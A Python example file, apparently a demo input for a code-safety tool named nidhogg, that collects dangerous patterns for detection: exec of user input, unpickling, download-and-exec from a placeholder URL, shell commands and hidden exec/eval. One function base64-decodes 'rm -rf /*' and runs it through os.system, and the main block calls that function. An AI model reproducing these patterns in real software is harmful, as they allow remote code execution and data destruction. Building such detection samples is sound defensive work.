# examples/code_execution.py

import os
import sys
import subprocess
import pickle
import base64
import urllib.request

def execute_user_code(code_str):
    """
    Executes user-provided code - this is very dangerous and should be detected
    """
    print(f"Executing code: {code_str}")
    # This should be caught and replaced with a safe version
    exec(code_str)

def process_pickle_data(data_file):
    """
    Loads pickle data from a file - also dangerous and should be detected
    """
    with open(data_file, 'rb') as f:
        data = f.read()
    
    # This should be caught and replaced with a safe version
    return pickle.loads(data)

def run_remote_code(url):
    """
    Downloads and executes code from a remote URL - extremely dangerous
    """
    # This should be caught and replaced with a safe version
    with urllib.request.urlopen(url) as response:
        remote_code = response.read().decode('utf-8')
    
    # This should be caught and replaced with a safe version
    exec(remote_code)

def run_command(cmd):
    """
    Executes a system command - also dangerous and should be detected
    """
    print(f"Running command: {cmd}")
    
    # These should all be caught and replaced with safe versions
    os.system(cmd)
    subprocess.call(cmd, shell=True)
    subprocess.run(cmd, shell=True)
    
    # This is also dangerous
    process = os.popen(cmd)
    output = process.read()
    process.close()
    
    return output

def dynamic_import(module_name):
    """
    Dynamically imports a module - potentially dangerous
    """
    # This should be caught and replaced with a safe version
    return __import__(module_name)

class ObfuscatedExecution:
    """
    Class that attempts to obfuscate dangerous behavior
    """
    def __init__(self):
        self.exec_function = exec
        self.eval_function = eval
    
    def run_code(self, code):
        """Attempt to hide exec call in a method"""
        # This should still be caught
        self.exec_function(code)
    
    def evaluate(self, expression):
        """Attempt to hide eval call in a method"""
        # This should still be caught
        return self.eval_function(expression)

def obfuscated_attack():
    """
    Function that tries to obfuscate an attack through encoding
    """
    # Base64 encoded command that would try to remove files
    encoded_cmd = "cm0gLXJmIC8qCg=="
    
    # Decode and execute
    cmd = base64.b64decode(encoded_cmd).decode('utf-8')
    
    # This should be caught
    os.system(cmd)

if __name__ == "__main__":
    """
    If this script is run, it would demonstrate several dangerous behaviors
    However, with nidhogg, these should all be caught and replaced with safe versions
    """
    execute_user_code("print('This is a relatively harmless example')")
    
    try:
        pickle_result = process_pickle_data("data.pkl")
        print(f"Pickle result: {pickle_result}")
    except:
        pass
    
    try:
        run_remote_code("https://example.com/malicious_code.py")
    except:
        pass
    
    try:
        output = run_command("ls -la")
        print(f"Command output: {output}")
    except:
        pass
    
    try:
        module = dynamic_import("random")
        print(f"Imported module: {module}")
    except:
        pass
    
    try:
        obfuscated = ObfuscatedExecution()
        obfuscated.run_code("print('Obfuscated execution')")
        result = obfuscated.evaluate("1 + 1")
        print(f"Evaluation result: {result}")
    except:
        pass
    
    try:
        obfuscated_attack()
    except:
        pass